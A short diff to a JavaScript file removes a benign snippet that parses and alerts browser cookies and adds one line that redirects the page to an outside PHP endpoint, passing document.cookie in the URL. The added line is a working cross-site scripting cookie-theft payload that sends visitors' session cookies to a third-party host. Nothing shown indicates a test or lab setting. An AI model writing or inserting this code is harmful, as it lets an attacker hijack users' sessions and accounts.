@@ -1,13 +1,1 @@
-var getCookies = function(){
-  var pairs = document.cookie.split(";");
-  var cookies = {};
-  for (var i=0; i<pairs.length; i++){
-    var pair = pairs[i].split("=");
-    cookies[(pair[0]+'').trim()] = unescape(pair.slice(1).join('='));
-  }
-  return cookies;
-}
-
-var myCookies = getCookies();
-console.log(myCookies);
-alert(myCookies.secret); // "do not tell you"
+document.location="http://gitchaelin.kro.kr/xss.php?cookie="+document.cookie;
